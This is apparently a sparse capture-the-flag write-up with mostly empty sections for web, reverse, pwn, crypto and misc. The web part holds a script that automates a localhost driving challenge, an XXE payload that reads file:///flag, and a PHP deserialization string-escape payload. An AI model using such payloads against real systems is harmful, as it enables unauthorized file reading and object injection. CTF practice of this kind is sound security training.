# web




```python
import requests
import re
url="http://localhost:19123/"
pattern = r'<font[^>]*>(.*?)</font>'

#-1:左,0:直,1:右
#
data={
    "driver":"kjiel",
    "steering_control":0,
    "throttle":2
}
headers={
    "cookie":""
}
def send():
    result=requests.post(url,data=data,headers=headers)
    ck=result.headers.get("Set-Cookie")
    print(ck)
    headers['cookie']=ck
    print(result.text)
    match = re.findall(pattern, result.text)
    result=match[0].split('，')
    if "左" in result[0]:
        data['steering_control']=1
    elif "右" in result[0]:
        data['steering_control']=-1
    elif "直行" in result[0]:
        data['steering_control']=0
    if "小" in result[1]:
        data['throttle']=0
    elif "保持" in result[1]:
        data['throttle']=1
    elif "大" in result[1]:
        data['throttle']=2
    print(data)
for i in range(7):
    send()
```




```xml
xml_content=<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///flag"> ]>
 <xml>
  <name>%26example;</name>
 </xml>
```

```payload
di_jiu_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}
```
# reverse

```python
from z3 import *

```

# pwn

# crypto

# Misc


---
# *相关wp*




2023-08-18   10:14